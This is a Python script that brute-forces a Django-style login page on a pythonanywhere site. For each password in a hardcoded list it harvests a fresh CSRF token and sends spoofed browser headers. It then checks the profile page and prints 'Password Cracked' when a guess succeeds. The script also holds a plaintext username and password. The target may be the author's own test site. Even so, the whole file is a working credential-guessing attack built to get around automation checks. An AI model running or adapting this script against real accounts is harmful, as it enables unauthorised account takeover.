import requests
from bs4 import BeautifulSoup
import time

url='https://curiosityishere.pythonanywhere.com/'
# url='http://127.0.0.1:8000/'

LOGIN_ROUTE = 'login/'

HEADERS={  #this is stop automation
    'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0',
    'origin':url, 'referer':url+LOGIN_ROUTE
}

USERNAME='Samir'
PASSWORD='Samir@123'
Password_List=['Samir','Sam','Sari','samir','Samir@1234','Samir@143','Samir@142','sae','SamirPAs','Samie123','admin','Test','Samir@123']

empty_string=''
name=''

t1=time.perf_counter()

for password in Password_List:
    s = requests.session()
    csrf_token = s.get(url).cookies['csrftoken']
    print(csrf_token)

    LOGIN_DATA = {
        'username': USERNAME,
        'password': password,
        'csrfmiddlewaretoken':csrf_token,
    }

    login_redirect=s.post(url+LOGIN_ROUTE,headers=HEADERS,data=LOGIN_DATA)

    redirect_url=s.get(url+'U/profile/').text

    soup=BeautifulSoup(redirect_url,'lxml')

    names=soup.find('h2',attrs={'style':"margin-top:30px;"})

    if not names == None:
        print("  Password Cracked ..! ",USERNAME," and ",password)
        break

t2=time.perf_counter()
print(f'  {t2-t1} seconds to cracked ..!')